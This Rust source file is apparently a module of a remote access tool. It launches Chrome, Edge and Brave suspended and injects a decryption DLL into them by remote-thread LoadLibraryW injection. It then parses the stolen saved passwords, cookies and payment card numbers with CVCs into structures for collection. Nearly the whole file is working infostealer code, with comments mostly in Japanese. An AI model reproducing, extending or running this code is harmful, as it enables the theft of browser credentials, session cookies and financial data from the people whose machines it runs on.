// Browser DLL Injection Module
// Automatically injects Chrome decrypt DLL into Chrome/Edge/Brave processes

use std::{
    ffi::{OsStr, c_void},
    os::windows::prelude::OsStrExt,
    path::PathBuf,
    // HashMap不要のため削除
};
use serde::{Deserialize, Serialize};
use windows::Win32::{
    Foundation::CloseHandle,
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        LibraryLoader::{GetModuleHandleW, GetProcAddress},
        Memory::{MEM_COMMIT, PAGE_READWRITE, VirtualAllocEx},
        Threading::{
            CREATE_SUSPENDED, CreateProcessW, CreateRemoteThread, LPTHREAD_START_ROUTINE,
            PROCESS_INFORMATION, STARTUPINFOW, WaitForSingleObject,
        },
    },
};
use windows::core::{PCSTR, PCWSTR, PWSTR};
use crate::RatError;

// DLL出力JSONの構造体
#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct DllCookieOut {
    pub host: String,
    pub name: String,
    pub path: String,
    pub value: String,
    pub expires: i64,
    pub secure: bool,
    #[serde(rename = "httpOnly")]
    pub http_only: bool,
}

#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct DllPasswordOut {
    pub origin: String,
    pub username: String,
    pub password: String,
}

#[derive(Debug, Deserialize, Serialize, Clone)]
pub struct DllPaymentOut {
    pub name_on_card: String,
    pub expiration_month: i64,
    pub expiration_year: i64,
    pub card_number: String,
    pub cvc: String,
}

// 統合されたブラウザデータ
#[derive(Debug, Default)]
pub struct BrowserData {
    pub passwords: Vec<DllPasswordOut>,
    pub cookies: Vec<DllCookieOut>,
    pub payments: Vec<DllPaymentOut>,
}

pub struct BrowserInjector {
    dll_path: PathBuf,
    output_dir: PathBuf,
}

impl BrowserInjector {
    pub fn new() -> Result<Self, RatError> {
        let dll_path = Self::find_rat64_dll()?;
        let output_dir = std::env::current_exe()
            .map_err(|e| RatError::Io(e))?
            .parent()
            .unwrap()
            .to_path_buf();
        
        Ok(Self {
            dll_path,
            output_dir,
        })
    }
    
    /// Chrome/Edge/Brave全てに対してDLL注入を実行し、データを収集
    pub async fn inject_all_browsers(&self) -> Result<BrowserData, RatError> {
        let browsers = ["chrome", "edge", "brave"];

        
        // 出力ディレクトリを環境変数に設定
        unsafe { 
            std::env::set_var("CHROME_DECRYPT_OUT_DIR", &self.output_dir);
        }
        
        for browser in &browsers {
            if let Some(exe_path) = self.find_browser_exe(browser) {
                let _ = self.inject_browser(&exe_path).await;
                
                // ブラウザ間の間隔を空ける
                tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            }
        }
        
        Ok(BrowserData::default())
    }
    
    /// 指定されたブラウザ実行ファイルにDLLを注入
    async fn inject_browser(&self, exe_path: &PathBuf) -> Result<(), RatError> {
        // Create suspended process
        let mut si = STARTUPINFOW::default();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi = PROCESS_INFORMATION::default();
        let mut cmdline = self.wide(exe_path.as_os_str());
        
        unsafe {
            let result = CreateProcessW(
                None,
                Some(PWSTR(cmdline.as_mut_ptr())),
                None,
                None,
                false,
                CREATE_SUSPENDED,
                None,
                None,
                &si,
                &mut pi,
            );
            if let Err(e) = result {
                return Err(RatError::Command(format!("CreateProcessW failed: {:?}", e)));
            }
        }
        
        // Prepare remote memory for DLL path (UTF-16)
        let dll_w = self.wide(self.dll_path.as_os_str());
        let remote_mem = unsafe {
            VirtualAllocEx(
                pi.hProcess,
                None,
                (dll_w.len() * 2) as usize,
                MEM_COMMIT,
                PAGE_READWRITE,
            )
        };
        if remote_mem.is_null() {
            return Err(RatError::Command("VirtualAllocEx failed".to_string()));
        }
        
        unsafe {
            let mut written = 0usize;
            let result = WriteProcessMemory(
                pi.hProcess,
                remote_mem,
                dll_w.as_ptr() as *const c_void,
                dll_w.len() * 2,
                Some(&mut written),
            );
            if let Err(e) = result {
                return Err(RatError::Command(format!("WriteProcessMemory failed: {:?}", e)));
            }
            if written != (dll_w.len() * 2) {
                return Err(RatError::Command("WriteProcessMemory size mismatch".to_string()));
            }
        }
        
        // Get LoadLibraryW and create remote thread
        let k32 = unsafe { 
            match GetModuleHandleW(PCWSTR(self.wide("kernel32.dll").as_ptr())) {
                Ok(handle) => handle,
                Err(e) => return Err(RatError::Command(format!("GetModuleHandleW failed: {:?}", e))),
            }
        };
        let proc = unsafe { GetProcAddress(k32, PCSTR(b"LoadLibraryW\0".as_ptr())) };
        if proc.is_none() {
            return Err(RatError::Command("GetProcAddress(LoadLibraryW) failed".to_string()));
        }
        let start: LPTHREAD_START_ROUTINE = Some(unsafe { 
            std::mem::transmute(proc.expect("LoadLibraryW proc address should be valid"))
        });
        
        let h_thread = unsafe { 
            match CreateRemoteThread(pi.hProcess, None, 0, start, Some(remote_mem), 0, None) {
                Ok(handle) => handle,
                Err(e) => return Err(RatError::Command(format!("CreateRemoteThread failed: {:?}", e))),
            }
        };
        
        unsafe {
            if let Err(e) = CloseHandle(h_thread) {
                return Err(RatError::Command(format!("CloseHandle(h_thread) failed: {:?}", e)));
            }
        }
        
        // Wait for process to terminate (DLL will call TerminateProcess)
        let _wait_result = unsafe { WaitForSingleObject(pi.hProcess, 30000) }; // 30秒タイムアウト
        
        unsafe {
            let _ = CloseHandle(pi.hThread);
            let _ = CloseHandle(pi.hProcess);
        }
        
        // 出力ファイルの存在確認
        tokio::time::sleep(tokio::time::Duration::from_millis(1000)).await;
        self.check_output_files().await;
        
        Ok(())
    }
    
    /// ブラウザの実行ファイルを検索
    fn find_browser_exe(&self, browser: &str) -> Option<PathBuf> {
        let pf = std::env::var_os("ProgramFiles");
        let pfx86 = std::env::var_os("ProgramFiles(x86)");
        let mut cands: Vec<PathBuf> = Vec::new();
        
        match browser.to_ascii_lowercase().as_str() {
            "chrome" => {
                if let Some(p) = pf.as_ref() {
                    cands.push(PathBuf::from(p).join("Google/Chrome/Application/chrome.exe"));
                }
                if let Some(p) = pfx86.as_ref() {
                    cands.push(PathBuf::from(p).join("Google/Chrome/Application/chrome.exe"));
                }
            }
            "edge" => {
                if let Some(p) = pf.as_ref() {
                    cands.push(PathBuf::from(p).join("Microsoft/Edge/Application/msedge.exe"));
                }
                if let Some(p) = pfx86.as_ref() {
                    cands.push(PathBuf::from(p).join("Microsoft/Edge/Application/msedge.exe"));
                }
            }
            "brave" => {
                if let Some(p) = pf.as_ref() {
                    cands.push(
                        PathBuf::from(p).join("BraveSoftware/Brave-Browser/Application/brave.exe"),
                    );
                }
                if let Some(p) = pfx86.as_ref() {
                    cands.push(
                        PathBuf::from(p).join("BraveSoftware/Brave-Browser/Application/brave.exe"),
                    );
                }
            }
            _ => {}
        }
        
        cands.into_iter().find(|p| p.exists())
    }
    
    /// Chrome Decrypt DLLファイルを検索
    fn find_rat64_dll() -> Result<PathBuf, RatError> {
        let manifest_dir = std::env::var("CARGO_MANIFEST_DIR")
            .unwrap_or_else(|_| ".".to_string());
        
        // Try different possible locations for chrome_decrypt.dll
        let candidates = [
            format!("{}/target/release-tiny/chrome_decrypt.dll", manifest_dir),
            format!("{}/target/release/chrome_decrypt.dll", manifest_dir),
            format!("{}/target/debug/chrome_decrypt.dll", manifest_dir),
            "./chrome_decrypt.dll".to_string(),
            "./target/release-tiny/chrome_decrypt.dll".to_string(),
            "./target/release/chrome_decrypt.dll".to_string(),
            "./target/debug/chrome_decrypt.dll".to_string(),
        ];
        
        for candidate in &candidates {
            let path = PathBuf::from(candidate);
            if path.exists() {
                return Ok(path);
            }
        }
        
        Err(RatError::Io(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "chrome_decrypt.dll not found. Try building with: cargo build -p chrome_decrypt --profile release-tiny"
        )))
    }
    
    // ファイルベース収集を削除：IPCで直接データを受信
    #[allow(dead_code)]
    async fn collect_injected_data(&self) -> Result<BrowserData, RatError> {
        let mut data = BrowserData::default();
        
        // Chromeディレクトリ内の出力ファイルをすべて検索
        let chrome_decrypt_out = self.output_dir.join("chrome_decrypt_out").join("Chrome");
        
        if !chrome_decrypt_out.exists() {
            println!("[INFO] Chromeディレクトリが存在しません");
            return Ok(data);
        }
        
        // プロファイルディレクトリを検索 (Default など)
        if let Ok(profile_entries) = std::fs::read_dir(&chrome_decrypt_out) {
            for profile_entry in profile_entries.flatten() {
                if profile_entry.path().is_dir() {
                    let profile_name = profile_entry.file_name().to_string_lossy().to_string();
                    println!("[INFO] Chrome {}プロファイルデータを収集中...", profile_name);
                    
                    // 各JSONファイルを読み込み
                    let passwords_file = profile_entry.path().join("passwords.json");
                    let cookies_file = profile_entry.path().join("cookies.json");
                    let payments_file = profile_entry.path().join("payments.json");
                    
                    // パスワードファイル
                    if passwords_file.exists() {
                        if let Ok(passwords) = self.load_passwords(&passwords_file) {
                            println!("[INFO] Chrome({})からパスワード{}件を収集", profile_name, passwords.len());
                            data.passwords.extend(passwords);
                        }
                    }
                    
                    // クッキーファイル
                    if cookies_file.exists() {
                        if let Ok(cookies) = self.load_cookies(&cookies_file) {
                            println!("[INFO] Chrome({})からクッキー{}件を収集", profile_name, cookies.len());
                            data.cookies.extend(cookies);
                        }
                    }
                    
                    // 支払いファイル
                    if payments_file.exists() {
                        if let Ok(payments) = self.load_payments(&payments_file) {
                            println!("[INFO] Chrome({})から支払い情報{}件を収集", profile_name, payments.len());
                            data.payments.extend(payments);
                        }
                    }
                }
            }
        }
        
        Ok(data)
    }
    
    /// パスワードJSONファイルを読み込み
    fn load_passwords(&self, path: &PathBuf) -> Result<Vec<DllPasswordOut>, RatError> {
        let content = std::fs::read_to_string(path)
            .map_err(|e| RatError::Io(e))?;
        let passwords: Vec<DllPasswordOut> = serde_json::from_str(&content)
            .map_err(|e| RatError::Command(format!("パスワードJSON解析エラー: {}", e)))?;
        Ok(passwords)
    }
    
    /// クッキーJSONファイルを読み込み
    fn load_cookies(&self, path: &PathBuf) -> Result<Vec<DllCookieOut>, RatError> {
        let content = std::fs::read_to_string(path)
            .map_err(|e| RatError::Io(e))?;
        let cookies: Vec<DllCookieOut> = serde_json::from_str(&content)
            .map_err(|e| RatError::Command(format!("クッキーJSON解析エラー: {}", e)))?;
        Ok(cookies)
    }
    
    /// 支払いJSONファイルを読み込み
    fn load_payments(&self, path: &PathBuf) -> Result<Vec<DllPaymentOut>, RatError> {
        let content = std::fs::read_to_string(path)
            .map_err(|e| RatError::Io(e))?;
        let payments: Vec<DllPaymentOut> = serde_json::from_str(&content)
            .map_err(|e| RatError::Command(format!("支払いJSON解析エラー: {}", e)))?;
        Ok(payments)
    }
    
    /// 出力ファイルの存在を確認
    async fn check_output_files(&self) {
        let chrome_decrypt_out = self.output_dir.join("chrome_decrypt_out").join("Chrome");
        // Check if output directory exists (no logging for cleaner output)
        
        if chrome_decrypt_out.exists() {
            println!("[DEBUG] Chromeディレクトリが存在します");
            if let Ok(entries) = std::fs::read_dir(&chrome_decrypt_out) {
                for entry in entries.flatten() {
                    println!("[DEBUG] 見つかった項目: {}", entry.path().display());
                    if entry.path().is_dir() {
                        // ブラウザディレクトリの中を確認
                        if let Ok(browser_entries) = std::fs::read_dir(entry.path()) {
                            for browser_entry in browser_entries.flatten() {
                                println!("[DEBUG]   ブラウザサブディレクトリ: {}", browser_entry.path().display());
                                if browser_entry.path().is_dir() {
                                    // プロファイルディレクトリの中を確認
                                    if let Ok(profile_entries) = std::fs::read_dir(browser_entry.path()) {
                                        for profile_entry in profile_entries.flatten() {
                                            println!("[DEBUG]     出力ファイル: {}", profile_entry.path().display());
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } else {
            // サイレント - Chrome未検出
        }
    }
    
    /// 文字列をUTF-16 (wide) 文字列に変換
    fn wide<S: AsRef<OsStr>>(&self, s: S) -> Vec<u16> {
        let mut v: Vec<u16> = s.as_ref().encode_wide().collect();
        v.push(0);
        v
    }
}